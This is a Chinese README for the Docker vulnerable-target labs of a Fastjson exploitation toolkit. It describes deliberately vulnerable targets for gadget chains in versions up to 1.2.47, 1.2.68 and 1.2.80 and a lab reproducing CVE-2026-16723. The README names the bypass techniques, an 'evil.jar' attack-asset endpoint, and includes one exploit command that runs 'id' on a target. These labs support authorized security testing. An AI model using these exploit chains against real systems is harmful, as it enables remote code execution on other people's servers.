# Docker 靶场一览

本目录存放 FastjsonExpToolkit 本地复现 / 验证用 Docker 环境。仅用于授权测试与本地研究。

| 靶场 | 目录 | 主机端口 | 作用（一句话） |
|------|------|----------|----------------|
| 指纹对照 | `json-fingerprint-lab` | `18080` | 多 JSON 库对照，验证识别引擎 |
| 版本矩阵 | `fastjson-version-lab` | `18030`–`18082` | 固定版本 Fastjson，验证版本探测 |
| ≤1.2.47 gadget | `fastjson-1247-lab` | `18247` | Class 缓存绕过 + 依赖链落盘证明 |
| ≤1.2.68 gadget | `fastjson-1268-lab` | `18268` | AutoCloseable expectClass 落盘证明 |
| ≤1.2.80 gadget | `fastjson-1280-lab` | `18280` | Exception 缓存绕过落盘证明 |
| CVE-2026-16723 | `cve-2026-16723` | `18083` | 1.2.68–1.2.83；lab 用 1.2.83 jar:http / fd-cache |

根目录 `docker-compose.yml` 只编排**指纹对照 + 版本矩阵**；gadget / CVE 靶场各自独立 compose。

主机端口均可通过环境变量覆盖（见各 compose 中的 `LAB_PORT_*`），Web `/lab` 启动时可手改。

---

## 快速启动

```bash
# 指纹 + 版本矩阵（根 compose）
cd lab
docker compose up --build -d

# 或只起某一版本矩阵服务
docker compose up --build -d fj-1-2-47

# gadget / CVE 靶场（进入子目录）
cd lab/fastjson-1247-lab && docker compose up --build -d
cd lab/fastjson-1268-lab && docker compose up --build -d
cd lab/fastjson-1280-lab && docker compose up --build -d
cd lab/cve-2026-16723 && docker compose up --build -d
```

停止：在对应目录执行 `docker compose down`。

---

## 1. json-fingerprint-lab — 指纹对照

| 项 | 值 |
|----|-----|
| 目录 | `lab/json-fingerprint-lab/` |
| 启动 | `lab/docker-compose.yml` → 服务 `json-fingerprint-lab` |
| 端口 | `18080` |
| JDK | Eclipse Temurin **8** JRE |
| 框架 | Spring Boot 2.7（Tomcat） |
| Fastjson | **1.2.83**（默认 SafeMode） |

**作用**：同一应用内提供 Fastjson / Jackson / Gson / org.json / Hutool 端点，用于验证「能认出 Fastjson、不误报其他库」，以及 CEYE DNS（autotype 端点）出网确认。

| 端点 | 解析器 / 行为 |
|------|----------------|
| `POST /api/fastjson` | Fastjson，默认安全模式 |
| `POST /api/fastjson/autotype` | Fastjson，开启 autoType |
| `POST /api/fastjson/silent` / `…/silent/autotype` | 不回显异常细节 |
| `POST /api/fastjson/person` | Fastjson 强类型 `Person`（期望类） |
| `POST /api/jackson` / `…/person` | Jackson |
| `POST /api/gson` | Gson |
| `POST /api/orgjson` | org.json |
| `POST /api/hutool` | Hutool JSON |

对应工具能力：探测页 `/detect`（识别 / 期望类 / 依赖）、DNS 出网。

---

## 2. fastjson-version-lab — 版本矩阵

| 项 | 值 |
|----|-----|
| 目录 | `lab/fastjson-version-lab/` |
| 启动 | `lab/docker-compose.yml` → `fj-1-2-30` / `47` / `68` / `80` |
| JDK | Eclipse Temurin **8** JRE |
| 实现 | 轻量 HTTP Server（非 Spring） |
| 依赖 | **仅 Fastjson**（无 BCEL/C3P0 等 gadget 依赖） |

**作用**：固定多个 Fastjson 小版本，验证版本探测（AutoType / SafeMode / AutoCloseable 回显 / 不出网二分 / DNS）。**不适合**跑完整 gadget 链（缺依赖），gadget 请用下方专用靶场。

| Compose 服务 | Fastjson | 主机端口 |
|--------------|----------|----------|
| `fj-1-2-30` | 1.2.30 | `18030` |
| `fj-1-2-47` | 1.2.47 | `18047` |
| `fj-1-2-68` | 1.2.68 | `18068` |
| `fj-1-2-80` | 1.2.80 | `18082` |

每个实例均提供：

- `POST /api/fastjson` — AutoType off，异常细节回显  
- `POST /api/fastjson/autotype` — AutoType on  
- `POST /api/fastjson/silent` / `…/silent/autotype` — 不透明 500  

对应工具能力：版本探测（`/version`）。

---

## 3. fastjson-1247-lab — ≤1.2.47 Class 缓存绕过

| 项 | 值 |
|----|-----|
| 目录 | `lab/fastjson-1247-lab/` |
| 启动 | 子目录 `docker compose up --build -d` |
| 端口 | `18247` |
| JDK | **`openjdk:8u242-jdk`**（须 ≤8u251，保留内部 BCEL ClassLoader） |
| Fastjson | 1.2.47，**AutoType 关闭** |
| 依赖 | tomcat-dbcp 7+9、commons-dbcp(2)、c3p0、mybatis、h2 1.4.200 |

**作用**：验证 `java.lang.Class` → MiscCodec 缓存绕过后的 gadget（JdbcRowSet / BCEL×4 / C3P0 / MyBatis / H2）。成功以 `/tmp/fj1247_*` 证明文件为准。

| 端点 | 说明 |
|------|------|
| `POST /api/fastjson` 或 `/json` | `JSON.parse`，AutoType off |
| `GET/DELETE /api/markers` | 查看 / 清理证明文件 |

一键验证：`python tests/lab/lab_test_1247_gadgets.py`  
对应：`fjtoolkit poc-1247`、Web `/poc` →「≤1.2.47」。详见 [fastjson-1247-lab/README.md](fastjson-1247-lab/README.md)。

---

## 4. fastjson-1268-lab — ≤1.2.68 AutoCloseable

| 项 | 值 |
|----|-----|
| 目录 | `lab/fastjson-1268-lab/` |
| 启动 | 子目录 `docker compose up --build -d` |
| 端口 | `18268` |
| JDK | Eclipse Temurin **11** JDK（MarshalOutputStream + Nashorn `URLReader`） |
| Fastjson | 1.2.68，**AutoType 关闭** |
| 依赖 | commons-io **2.6**、commons-codec、aspectjtools 1.9.6、ant、mysql-connector 5.1.48、postgresql、spring-context |

**作用**：验证双 `@type` + `java.lang.AutoCloseable` expectClass 链（JDK 写/截断、commons-io io1–io5/ioFinal、读文件、MySQL/PG）。证明文件：`/tmp/fj1268_*`。

| 端点 | 说明 |
|------|------|
| `POST /api/fastjson` 或 `/json` | `JSON.parse`，AutoType off |
| `GET/DELETE /api/markers` | 查看 / 清理证明文件 |

一键验证：`python tests/lab/lab_test_1268_gadgets.py`  
对应：`fjtoolkit poc-1268`、Web `/poc` →「≤1.2.68」。详见 [fastjson-1268-lab/README.md](fastjson-1268-lab/README.md)。

---

## 5. fastjson-1280-lab — ≤1.2.80 Exception 缓存

| 项 | 值 |
|----|-----|
| 目录 | `lab/fastjson-1280-lab/` |
| 启动 | 子目录 `docker compose up --build -d` |
| 端口 | `18280` |
| JDK | Eclipse Temurin **11** JDK（Nashorn `URLReader`） |
| Fastjson | 1.2.80，**AutoType 关闭**，**共享 ParserConfig** |
| 依赖 | jackson-core 2.13.5、commons-io 2.6、ant、groovy 2.4.21、aspectjtools、mysql 5.1.48、postgresql、spring-context、jython |

**作用**：验证 `java.lang.Exception` expectClass + `ParserConfig.getDeserializer` 缓存后恢复危险类型（jackson→InputStream、commons-io、PG/MySQL、groovy、aspectj、jython）。RCE 证明标准：写 `/tmp/fj1280_*`。多步链依赖共享 CFG，勿每请求新建。

| 端点 | 说明 |
|------|------|
| `POST /api/fastjson` 或 `/json` | 共享 ParserConfig |
| `POST /api/reset` | 清空反序列化器缓存 |
| `GET/DELETE /api/markers` | 证明文件 |
| `GET /attack/evil.jar` 等 | Groovy SPI / Spring XML 攻击资产 |

一键验证：`python tests/lab/lab_test_1280_gadgets.py`  
对应：`fjtoolkit poc-1280`、Web `/poc` →「≤1.2.80」。详见 [fastjson-1280-lab/README.md](fastjson-1280-lab/README.md)。

---

## 6. cve-2026-16723 — Undertow（证明靶场：1.2.83）

| 项 | 值 |
|----|-----|
| 目录 | `lab/cve-2026-16723/` |
| 启动 | 子目录 `docker compose up --build -d` |
| HTTP | `18083` → 容器 `8080` |
| JDWP | `18505` → 容器 `5005` |
| JDK | Eclipse Temurin **8** JRE（`8u432`）；**须 JDK8**（11+ `defineClass` 拒连续 `/`） |
| 框架 | Spring Boot 2.7 + **Undertow** fat jar（非 Tomcat） |
| Fastjson | **1.2.83**（证明用；CVE 官方范围为 **1.2.68–1.2.83**，不仅限于 83） |
| extra_hosts | `attacker` / `host.docker.internal` → host-gateway |

**作用**：复现 CVE-2026-16723（jar:http / jar:file / fd-cache）。必须用 **fat jar** 启动（TCCL=`LaunchedURLClassLoader`）；IDE 炸包 classpath 会失败。`jar:http` 主机名须无点号（用 `attacker`，勿用 `127.0.0.1`）。

| 端点 | 说明 |
|------|------|
| `POST /json` | 裸 `JSON.parse` |

对应：`fjtoolkit poc-16723`、`POST /api/poc/cve-2026-16723`、Web `/poc` → CVE Tab。

```bash
# 出网回显（Docker 内访问宿主机用 -H attacker）
fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -e -c id --engine undertow
```

---

## 选用建议

| 你要验证… | 用哪个 |
|-----------|--------|
| 是否 Fastjson / 是否误报 | 指纹对照 `:18080` |
| 版本区间 / AutoType / SafeMode | 版本矩阵 `:18030`–`:18082` |
| ≤1.2.47 完整 gadget | `fastjson-1247-lab` `:18247`（不要用 `:18047`） |
| ≤1.2.68 AutoCloseable | `fastjson-1268-lab` `:18268` |
| ≤1.2.80 Exception 缓存 | `fastjson-1280-lab` `:18280` |
| CVE-2026-16723（1.2.68–1.2.83） | `cve-2026-16723` `:18083`（lab 用 1.2.83） |

版本矩阵端口只有 Fastjson 本体；gadget 依赖与 JDK 约束见各子目录 README。
